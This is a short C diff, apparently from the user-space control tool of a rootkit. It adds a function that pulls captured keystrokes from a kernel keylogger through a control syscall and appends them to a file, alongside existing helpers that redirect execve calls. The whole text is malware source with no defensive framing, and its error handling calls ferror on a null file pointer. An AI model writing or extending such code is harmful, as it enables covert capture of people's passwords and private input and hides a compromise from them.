@@ -159,4 +159,27 @@ void unredirect_execve(char *path)
 	anima_control(SYSCALL_UNREDIRECT_EXECVE, &args);
 }
 
+void get_keylogger_buf(const char *path)
+{
+	struct rk_args args;
+	char keylogger_buf[1024];
+	FILE *fp;
+
+	memset(keylogger_buf, 0, sizeof(keylogger_buf));
+
+	fp = fopen(path, "a+");
+	if (!fp) {
+		ferror(fp);
+		return;
+	}
+
+	args.p_param1 = (char *)keylogger_buf;
+	args.param2 = sizeof(keylogger_buf);
+	anima_control(SYSCALL_GET_KEYLOGGER_BUF, &args);
+
+
+	fwrite(keylogger_buf, 1, sizeof(keylogger_buf), fp);
+	fclose(fp);
+}
+
 
